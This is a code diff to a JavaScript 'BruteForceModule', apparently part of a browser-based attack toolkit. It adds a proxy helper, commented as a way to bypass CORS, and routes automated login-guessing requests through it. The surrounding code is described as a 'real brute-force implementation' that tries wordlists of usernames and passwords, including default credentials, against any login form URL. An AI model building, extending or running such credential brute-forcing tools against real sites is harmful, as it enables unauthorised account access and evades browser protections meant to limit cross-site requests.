@@ -17,6 +17,22 @@ const BruteForceModule = (() => {
         { user: "guest", pass: "guest" },
     ];
 
+    // Helper to bypass CORS using our backend proxy
+    async function proxyFetch(url, options = {}) {
+        const proxyBody = JSON.stringify({
+            url: url,
+            method: options.method || "GET",
+            headers: options.headers || {},
+            body: options.body || null
+        });
+
+        return await fetch("/api/proxy", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: proxyBody
+        });
+    }
+
     // Real brute-force implementation using fetch
     async function runBruteForce(config, outputEl, progressEl, fillEl, textEl) {
         const { url, userField, passField, usernames, passwords, failText } = config;
@@ -69,7 +85,7 @@ const BruteForceModule = (() => {
                 body.append(passField, p);
 
                 const start = Date.now();
-                const resp = await fetch(url, {
+                const resp = await proxyFetch(url, {
                     method: "POST",
                     headers: { "Content-Type": "application/x-www-form-urlencoded" },
                     body: body.toString(),
